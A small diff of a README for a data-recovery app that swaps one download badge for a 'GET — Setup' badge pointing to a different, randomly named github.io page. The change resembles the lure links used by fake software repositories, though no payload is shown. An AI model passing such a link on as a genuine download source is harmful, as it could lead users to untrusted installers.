@@ -4,11 +4,7 @@
 <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple128/v4/69/37/b7/6937b79e-7c50-6620-e024-82c643771dcc/icon.png/1200x600bf.png" alt="Do Your Data Recovery Icon" width="200" height="200">  
 </div>  
 
-<div align="center">  
-<a href="https://waltersddance.github.io/.github/do-your-data-recovery">  
-<img src="https://img.shields.io/badge/Get_Do_Your_Data_Recovery-darkgreen?style=for-the-badge&logo=apple" alt="Get Do Your Data Recovery">  
-</a>  
-</div>  
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://dorthyplittxqiqm.github.io/.github/Do-Your-Data-Recovery)
 
 ---
 
